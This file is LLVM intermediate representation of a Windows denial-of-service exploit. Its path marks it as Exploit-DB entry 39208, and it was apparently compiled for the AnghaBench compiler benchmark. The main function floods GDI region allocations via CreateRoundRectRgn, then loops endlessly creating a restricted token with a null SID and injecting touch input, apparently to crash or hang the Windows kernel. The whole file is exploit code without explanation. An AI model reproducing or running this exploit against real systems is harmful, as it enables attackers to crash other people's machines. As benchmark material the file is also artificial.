; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_39208.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_39208.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_12__ = type { i32, i32, i32, %struct.TYPE_11__, %struct.TYPE_10__ }
%struct.TYPE_11__ = type { i8, i8, i8, i8 }
%struct.TYPE_10__ = type { i32, %struct.TYPE_9__, i32 }
%struct.TYPE_9__ = type { i8, i8 }

@PT_TOUCH = common dso_local global i32 0, align 4
@POINTER_FLAG_DOWN = common dso_local global i32 0, align 4
@POINTER_FLAG_INRANGE = common dso_local global i32 0, align 4
@POINTER_FLAG_INCONTACT = common dso_local global i32 0, align 4
@TOUCH_FLAG_NONE = common dso_local global i32 0, align 4
@TOUCH_MASK_CONTACTAREA = common dso_local global i32 0, align 4
@SECURITY_MAX_SID_SIZE = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i32 0, align 4
@WinNullSid = common dso_local global i32 0, align 4
@TOUCH_FEEDBACK_DEFAULT = common dso_local global i32 0, align 4
@MAX_TOUCH_COUNT = common dso_local global i32 0, align 4
@MAXIMUM_ALLOWED = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_12__, align 4
  %7 = alloca %struct.TYPE_12__, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @ZeroMemory(%struct.TYPE_12__* %6, i32 28)
  %11 = call i32 @ZeroMemory(%struct.TYPE_12__* %7, i32 28)
  %12 = load i32, i32* @PT_TOUCH, align 4
  %13 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 4
  %14 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %13, i32 0, i32 2
  store i32 %12, i32* %14, align 4
  %15 = load i32, i32* @POINTER_FLAG_DOWN, align 4
  %16 = load i32, i32* @POINTER_FLAG_INRANGE, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @POINTER_FLAG_INCONTACT, align 4
  %19 = or i32 %17, %18
  %20 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 4
  %21 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 4
  %23 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %22, i32 0, i32 1
  %24 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %23, i32 0, i32 0
  store i8 65, i8* %24, align 4
  %25 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 4
  %26 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %25, i32 0, i32 1
  %27 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %26, i32 0, i32 1
  store i8 65, i8* %27, align 1
  %28 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 3
  %29 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %28, i32 0, i32 0
  store i8 65, i8* %29, align 4
  %30 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 3
  %31 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %30, i32 0, i32 1
  store i8 65, i8* %31, align 1
  %32 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 3
  %33 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %32, i32 0, i32 2
  store i8 65, i8* %33, align 2
  %34 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 3
  %35 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %34, i32 0, i32 3
  store i8 65, i8* %35, align 1
  %36 = load i32, i32* @TOUCH_FLAG_NONE, align 4
  %37 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 2
  store i32 %36, i32* %37, align 4
  %38 = load i32, i32* @TOUCH_MASK_CONTACTAREA, align 4
  %39 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %6, i32 0, i32 1
  store i32 %38, i32* %39, align 4
  %40 = load i32, i32* @SECURITY_MAX_SID_SIZE, align 4
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* @INVALID_HANDLE_VALUE, align 4
  store i32 %41, i32* %9, align 4
  %42 = load i32, i32* %8, align 4
  %43 = call i32 @_alloca(i32 %42)
  %44 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %7, i32 0, i32 0
  store i32 %43, i32* %44, align 4
  %45 = load i32, i32* @WinNullSid, align 4
  %46 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %7, i32 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @CreateWellKnownSid(i32 %45, i32* null, i32 %47, i32* %8)
  store i32 67108864, i32* %8, align 4
  br label %49

49:                                               ; preds = %59, %2
  %50 = load i32, i32* %8, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %62

52:                                               ; preds = %49
  br label %53

53:                                               ; preds = %57, %52
  %54 = load i32, i32* %8, align 4
  %55 = call i64 @CreateRoundRectRgn(i32 0, i32 0, i32 1, i32 %54, i32 1, i32 1)
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %53
  br label %53

58:                                               ; preds = %53
  br label %59

59:                                               ; preds = %58
  %60 = load i32, i32* %8, align 4
  %61 = ashr i32 %60, 1
  store i32 %61, i32* %8, align 4
  br label %49

62:                                               ; preds = %49
  br label %63

63:                                               ; preds = %63, %62
  %64 = load i32, i32* @TOUCH_FEEDBACK_DEFAULT, align 4
  %65 = call i32 @InitializeTouchInjection(i32 1, i32 %64)
  %66 = load i32, i32* @MAX_TOUCH_COUNT, align 4
  %67 = load i32, i32* @TOUCH_FEEDBACK_DEFAULT, align 4
  %68 = call i32 @InitializeTouchInjection(i32 %66, i32 %67)
  %69 = call i32 (...) @GetCurrentProcess()
  %70 = load i32, i32* @MAXIMUM_ALLOWED, align 4
  %71 = call i32 @OpenProcessToken(i32 %69, i32 %70, i32* %9)
  %72 = load i32, i32* %9, align 4
  %73 = call i32 @CreateRestrictedToken(i32 %72, i32 0, i32 0, i32* null, i32 0, i32* null, i32 1, %struct.TYPE_12__* %7, i32* %9)
  %74 = call i32 @InjectTouchInput(i32 1, %struct.TYPE_12__* %6)
  br label %63
}

declare dso_local i32 @ZeroMemory(%struct.TYPE_12__*, i32) #1

declare dso_local i32 @_alloca(i32) #1

declare dso_local i32 @CreateWellKnownSid(i32, i32*, i32, i32*) #1

declare dso_local i64 @CreateRoundRectRgn(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @InitializeTouchInjection(i32, i32) #1

declare dso_local i32 @OpenProcessToken(i32, i32, i32*) #1

declare dso_local i32 @GetCurrentProcess(...) #1

declare dso_local i32 @CreateRestrictedToken(i32, i32, i32, i32*, i32, i32*, i32, %struct.TYPE_12__*, i32*) #1

declare dso_local i32 @InjectTouchInput(i32, %struct.TYPE_12__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
